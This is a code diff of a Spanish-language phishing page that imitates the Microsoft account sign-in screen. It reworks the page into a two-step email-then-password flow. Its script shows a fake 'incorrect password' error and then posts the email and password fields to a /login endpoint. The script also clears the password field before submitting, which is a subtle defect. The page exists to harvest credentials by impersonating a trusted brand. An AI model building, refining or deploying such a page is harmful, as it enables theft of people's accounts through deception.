@@ -3,62 +3,142 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1.0">
-<title>Iniciar sesi&oacute;n en su cuenta</title>
+<title>Inicio de sesi&oacute;n en su cuenta</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{font-family:"Segoe UI","SegoeUI","Helvetica Neue",Helvetica,Arial,sans-serif;background:#f2f2f2;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
-.container{background:#fff;padding:44px;box-shadow:0 2px 6px rgba(0,0,0,.2);width:100%;max-width:440px}
-.logo{display:flex;align-items:center;gap:8px;margin-bottom:16px}
-.logo-icon{display:grid;grid-template-columns:1fr 1fr;gap:2px;width:21px;height:21px}
-.logo-icon span:nth-child(1){background:#f25022}
-.logo-icon span:nth-child(2){background:#7fba00}
-.logo-icon span:nth-child(3){background:#00a4ef}
-.logo-icon span:nth-child(4){background:#ffb900}
-.logo-text{font-size:15px;color:#242424;font-weight:600}
-h1{font-size:24px;font-weight:600;color:#1b1b1b;margin-bottom:4px}
-.subtitle{color:#1b1b1b;font-size:15px;margin-bottom:16px}
-.form-group{margin-bottom:16px}
-.form-group input{width:100%;padding:6px 12px;border:1px solid #8a8886;font-size:15px;color:#1b1b1b;background:#fff}
-.form-group input:focus{outline:none;border-color:#0067b8;border-bottom:2px solid #0067b8}
-.form-group input::placeholder{color:#666}
-.btn{background:#0067b8;color:#fff;border:none;padding:8px 32px;font-size:15px;font-weight:600;cursor:pointer;min-width:108px;float:right}
-.btn:hover{background:#106ebe}
-.links{margin-top:24px;font-size:13px}
-.links a{color:#0067b8;text-decoration:none}
-.links a:hover{text-decoration:underline}
-.create{margin-top:16px;font-size:13px;color:#1b1b1b}
+.box{background:#fff;padding:44px;box-shadow:0 2px 6px rgba(0,0,0,.2);width:100%;max-width:440px}
+.ms-logo{display:flex;align-items:center;gap:8px;margin-bottom:32px}
+.ms-grid{display:grid;grid-template-columns:1fr 1fr;gap:2px;width:21px;height:21px}
+.ms-grid span:nth-child(1){background:#f25022}
+.ms-grid span:nth-child(2){background:#7fba00}
+.ms-grid span:nth-child(3){background:#00a4ef}
+.ms-grid span:nth-child(4){background:#ffb900}
+.ms-label{font-size:15px;color:#242424;font-weight:600;letter-spacing:-.2px}
+h1{font-size:24px;font-weight:600;color:#1b1b1b;margin-bottom:4px;line-height:1.2}
+.subtitle{color:#1b1b1b;font-size:13px;margin-bottom:24px}
+.step{display:none}
+.step.active{display:block}
+.field-wrap{margin-bottom:8px}
+.field-wrap input{width:100%;padding:6px 0 4px;border:none;border-bottom:1px solid #8a8886;font-size:15px;color:#1b1b1b;background:transparent;font-family:inherit;outline:none}
+.field-wrap input:focus{border-bottom:2px solid #0067b8}
+.field-wrap input::placeholder{color:#605e5c}
+.field-label{font-size:13px;color:#605e5c;margin-bottom:4px}
+.action-row{display:flex;justify-content:flex-end;align-items:center;margin-top:24px;gap:16px}
+.link-btn{color:#0067b8;font-size:13px;text-decoration:none;background:none;border:none;cursor:pointer;font-family:inherit;padding:0}
+.link-btn:hover{text-decoration:underline}
+.btn-next,.btn-signin{background:#0067b8;color:#fff;border:none;padding:8px 32px;font-size:15px;font-weight:600;cursor:pointer;font-family:inherit;min-width:108px;transition:background .1s}
+.btn-next:hover,.btn-signin:hover{background:#106ebe}
+.btn-next:active,.btn-signin:active{background:#005da6}
+.btn-next:disabled,.btn-signin:disabled{background:#c8c8c8;cursor:default}
+.back-btn{display:flex;align-items:center;gap:4px;color:#0067b8;font-size:13px;background:none;border:none;cursor:pointer;font-family:inherit;padding:0;margin-bottom:16px}
+.back-btn:hover{text-decoration:underline}
+.back-arrow{font-size:16px;line-height:1}
+.options{margin-top:24px;font-size:13px}
+.options a{color:#0067b8;text-decoration:none;display:block;margin-bottom:8px}
+.options a:hover{text-decoration:underline}
+.create{margin-top:32px;font-size:13px;color:#1b1b1b}
 .create a{color:#0067b8;text-decoration:none;font-weight:600}
-.signin-options{margin-top:24px;font-size:13px}
-.signin-options a{color:#0067b8;text-decoration:none}
-@media(max-width:480px){.container{padding:24px}}
+.account-display{display:flex;align-items:center;gap:10px;margin-bottom:24px}
+.account-avatar{width:32px;height:32px;background:#0067b8;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#fff;font-weight:700;font-size:14px}
+.account-email{font-size:13px;color:#1b1b1b}
+.error-inline{color:#a80000;font-size:12px;margin-top:4px;display:none}
+.error-inline.show{display:block}
+@media(max-width:480px){.box{padding:24px}}
 </style>
 </head>
 <body>
-<div class="container">
-<div class="logo">
-<div class="logo-icon"><span></span><span></span><span></span><span></span></div>
-<span class="logo-text">Microsoft</span>
+<div class="box">
+  <div class="ms-logo">
+    <div class="ms-grid"><span></span><span></span><span></span><span></span></div>
+    <span class="ms-label">Microsoft</span>
+  </div>
+
+  <!-- Paso 1: Email -->
+  <div class="step active" id="step1">
+    <h1>Iniciar sesi&oacute;n</h1>
+    <p class="subtitle">Para continuar en Microsoft</p>
+    <form id="emailForm" onsubmit="goStep2(event)">
+      <div class="field-wrap">
+        <div class="field-label">Correo electr&oacute;nico, tel&eacute;fono o Skype</div>
+        <input type="text" id="emailField" name="field1_preview" autocomplete="off" required>
+      </div>
+      <div class="error-inline" id="emailErr">Introduce una direcci&oacute;n de correo electr&oacute;nico, n&uacute;mero de tel&eacute;fono o nombre de Skype v&aacute;lidos.</div>
+      <div class="options">
+        <a href="#">&iquest;No tienes una cuenta? Crear una</a>
+        <a href="#">&iquest;No puedes acceder a tu cuenta?</a>
+        <a href="#">Opciones de inicio de sesi&oacute;n</a>
+      </div>
+      <div class="action-row">
+        <button type="submit" class="btn-next">Siguiente</button>
+      </div>
+    </form>
+  </div>
+
+  <!-- Paso 2: Contraseña -->
+  <div class="step" id="step2">
+    <button class="back-btn" onclick="goBack()" type="button"><span class="back-arrow">&#8592;</span></button>
+    <h1>Escribir contrase&ntilde;a</h1>
+    <div class="account-display">
+      <div class="account-avatar" id="avatarLetter">?</div>
+      <div class="account-email" id="accountEmail"></div>
+    </div>
+    <form id="loginForm" action="/login" method="POST">
+      <input type="hidden" name="field1" id="hiddenEmail">
+      <div class="field-wrap">
+        <div class="field-label">Contrase&ntilde;a</div>
+        <input type="password" id="passField" name="field2" autocomplete="off" required>
+      </div>
+      <div class="error-inline" id="passErr">Tu cuenta o contrase&ntilde;a es incorrecta. Si no recuerdas tu contrase&ntilde;a, r&eacute;establ&eacute;cela ahora.</div>
+      <div class="options">
+        <a href="#">Olvid&eacute; mi contrase&ntilde;a</a>
+      </div>
+      <div class="action-row">
+        <a href="#" class="link-btn">Otras formas de iniciar sesi&oacute;n</a>
+        <button type="submit" class="btn-signin" id="signinBtn">Iniciar sesi&oacute;n</button>
+      </div>
+    </form>
+  </div>
 </div>
-<h1>Iniciar sesi&oacute;n</h1>
-<p class="subtitle">Para continuar, inicia sesi&oacute;n o crea una cuenta.</p>
-<form action="/login" method="POST">
-<div class="form-group">
-<input type="text" name="field1" placeholder="Correo electr&oacute;nico, tel&eacute;fono o Skype" required autocomplete="off">
-</div>
-<div class="form-group">
-<input type="password" name="field2" placeholder="Contrase&ntilde;a" required autocomplete="off">
-</div>
-<div style="overflow:hidden">
-<button type="submit" class="btn">Iniciar sesi&oacute;n</button>
-</div>
-</form>
-<div class="signin-options">
-<a href="#">&iquest;No puedes acceder a tu cuenta?</a>
-</div>
-<div class="links">
-<a href="#">Opciones de inicio de sesi&oacute;n</a>
-</div>
-<div class="create">&iquest;No tienes una cuenta? <a href="#">Crear una</a></div>
-</div>
+<script>
+function goStep2(e) {
+  e.preventDefault();
+  var email = document.getElementById('emailField').value.trim();
+  var errEl = document.getElementById('emailErr');
+  if (email.length < 3) {
+    errEl.classList.add('show');
+    return;
+  }
+  errEl.classList.remove('show');
+  document.getElementById('hiddenEmail').value = email;
+  document.getElementById('accountEmail').textContent = email;
+  document.getElementById('avatarLetter').textContent = email[0].toUpperCase();
+  document.getElementById('step1').classList.remove('active');
+  document.getElementById('step2').classList.add('active');
+  document.getElementById('passField').focus();
+}
+function goBack() {
+  document.getElementById('step2').classList.remove('active');
+  document.getElementById('step1').classList.add('active');
+}
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+  e.preventDefault();
+  var btn = document.getElementById('signinBtn');
+  var errEl = document.getElementById('passErr');
+  btn.disabled = true;
+  btn.textContent = 'Iniciando...';
+  setTimeout(function() {
+    errEl.classList.add('show');
+    btn.disabled = false;
+    btn.textContent = 'Iniciar sesion';
+    document.getElementById('passField').value = '';
+    document.getElementById('passField').focus();
+    setTimeout(function() {
+      errEl.classList.remove('show');
+      document.getElementById('loginForm').submit();
+    }, 2500);
+  }, 1400);
+});
+</script>
 </body>
 </html>
